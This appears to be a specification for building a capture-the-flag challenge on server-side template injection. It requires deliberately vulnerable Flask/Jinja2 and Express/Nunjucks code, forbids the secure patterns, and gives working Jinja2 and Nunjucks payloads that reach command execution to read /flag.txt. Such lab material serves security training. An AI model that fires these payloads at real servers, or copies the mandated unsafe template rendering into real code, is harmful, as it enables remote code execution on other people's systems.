# Server-Side Template Injection (SSTI)

## Vulnerability Type
`ssti` — CWE-1336 — OWASP A03:2021 Injection

## Architecture
- **Backend**: Python Flask (Jinja2) OR Node.js Express (Nunjucks/Pug)
- **Database**: None required
- **Container**: Single container with `/flag.txt`

## Vulnerable Code Pattern (MUST USE)

### Python Flask (Preferred)
```python
from flask import Flask, request, render_template_string

# VULNERABLE: ssti — user input directly in render_template_string
@app.route('/profile')
def profile():
    name = request.args.get('name', 'Guest')
    template = f"<h1>Hello, {name}!</h1>"
    return render_template_string(template)
```

### Node.js Express + Nunjucks
```javascript
const nunjucks = require('nunjucks');

// VULNERABLE: ssti — user input rendered as template
app.get('/profile', (req, res) => {
    const name = req.query.name || 'Guest';
    const output = nunjucks.renderString(`<h1>Hello, ${name}!</h1>`);
    res.send(output);
});
```

## Secure Code Pattern (MUST AVOID)
```python
# SAFE — pass as variable, not in template string (DO NOT USE)
return render_template('profile.html', name=name)
```
```javascript
// SAFE — pass as context variable (DO NOT USE)
res.render('profile', { name: name });
```

## Flag Delivery
- Flag in `/flag.txt` inside the container
- OR flag in environment variable `FLAG`
- SSTI → RCE → read flag file

## Exploit Payload

### Python/Jinja2
```
name={{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}
```
Simpler for easy difficulty:
```
name={{''.__class__.__mro__[1].__subclasses__()[X]('cat /flag.txt',shell=True,stdout=-1).communicate()[0]}}
```

### Nunjucks
```
name={{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag.txt').toString()")()}}
```

## Validation Criteria
- User input MUST be interpolated INTO the template string (not passed as a variable)
- `render_template_string(f"...{user_input}...")` NOT `render_template('file.html', var=input)`
- `{{7*7}}` in the name parameter MUST render as `49` in the response
- `/flag.txt` MUST exist in the container
